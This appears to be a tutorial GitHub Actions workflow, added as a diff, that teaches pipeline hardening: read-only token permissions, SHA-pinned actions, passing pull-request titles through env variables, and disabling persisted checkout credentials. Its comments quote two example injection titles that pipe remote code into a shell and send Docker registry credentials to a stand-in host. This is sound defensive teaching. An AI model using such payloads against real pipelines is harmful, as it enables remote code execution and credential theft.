@@ -1,0 +1,121 @@
+# STEP 10 — Harden the PIPELINE ITSELF (before we scan any code).
+#
+# 🎯 GOAL: fix the attack surface most teams never think about — the workflow
+#          file. Your pipeline can push images and deploy to production. That
+#          makes it the most privileged thing in your repository, and the
+#          highest-value target in it.
+#
+# Four changes, all cheap, all in this file:
+#
+# 1. LEAST-PRIVILEGE PERMISSIONS
+#    GITHUB_TOKEN can default to write access across the whole repo. A
+#    compromised dependency in a test run could then push commits or delete
+#    releases. Default to `contents: read` at the top and elevate per job.
+#
+# 2. PIN THIRD-PARTY ACTIONS TO A COMMIT SHA
+#    `uses: some/action@v1` is a MOVING pointer. Whoever controls that repo can
+#    repoint the tag at new code, and it runs inside your pipeline with your
+#    credentials — the exact shape of the tj-actions/changed-files compromise.
+#    A SHA cannot be moved. Note which actions we pin and which we do not:
+#    actions/* and aws-actions/* are first-party; everything else gets a SHA.
+#    (Dependabot will raise PRs to bump the SHAs for you.)
+#
+# 3. NEVER INTERPOLATE UNTRUSTED INPUT INTO A `run:` BLOCK
+#    ${{ github.event.pull_request.title }} is pasted into the shell BEFORE the
+#    shell runs. A PR titled  a"; curl evil.sh | sh; #  executes on your runner.
+#    Pass it through `env:` instead — then it is a shell variable, and data
+#    stays data. This is THE GitHub Actions injection bug.
+#
+# 4. `persist-credentials: false` ON CHECKOUT
+#    By default checkout leaves a usable push token in .git/config for the rest
+#    of the job. If you are not pushing, do not leave the key in the door.
+#
+# 👀 OBSERVE: run the `injection-demo` job with a malicious PR title and see it
+#    printed harmlessly as text rather than executed.
+
+name: Step 10 - Harden the Workflow
+
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [main]
+
+# ⬇️ The single most valuable line in the file.
+permissions:
+  contents: read
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  hardened-ci:
+    name: 🛡️ Hardened CI
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      # First-party actions/* — trusted publisher, version tag is fine.
+      - uses: actions/checkout@v5
+        with:
+          # Do not leave a push-capable token behind in .git/config.
+          persist-credentials: false
+
+      - uses: actions/setup-python@v6
+        with:
+          python-version: '3.12'
+          cache: 'pip'
+          cache-dependency-path: requirements-dev.txt
+
+      - run: pip install -r requirements-dev.txt
+
+      - run: ruff check . --output-format=github
+      - run: pytest --cov=app --cov-report=term-missing
+
+  # ── The injection lesson, made concrete ──────────────────────────────────
+  injection-demo:
+    name: 💉 Safe handling of untrusted input
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      # 🚫 NEVER DO THIS — left here, commented, because seeing the shape of
+      #    the bug is what makes it memorable:
+      #
+      #    - run: echo "PR title: ${{ github.event.pull_request.title }}"
+      #
+      #    Actions substitutes the title into the script text first, so the
+      #    shell parses whatever the PR author wrote. A title of
+      #        x"; cat $HOME/.docker/config.json | curl -d @- evil.com; #
+      #    exfiltrates your registry credentials.
+
+      # ✅ DO THIS. The value arrives as an environment variable. The shell
+      #    never parses it, so it can only ever be a string.
+      - name: Print the PR title safely
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          echo "PR title: $PR_TITLE"
+          echo "Quoted, so any shell metacharacters above are just text."
+
+  # ── What SHA-pinned third-party actions look like ────────────────────────
+  pinned-actions-example:
+    name: 📌 SHA-pinned third-party action
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          persist-credentials: false
+
+      # A third-party action, pinned to a full 40-character commit SHA with
+      # the human-readable version in a trailing comment.
+      #
+      # ⚠️ The SHA below is an EXAMPLE. Get the real one from the action's
+      #    repository: Releases -> the tag -> the commit it points at. Or just
+      #    let Dependabot pin and update them for you (.github/dependabot.yml).
+      - name: Set up Docker Buildx (pinned)
+        uses: docker/setup-buildx-action@c47758b77c9736f4b2ef4073d4d51994fabfe349  # v3.7.1
+
+      - name: Why this matters
+        run: |
+          echo "A tag can be repointed by whoever owns the action repo."
+          echo "A commit SHA cannot. Same guarantee your lockfile gives you."
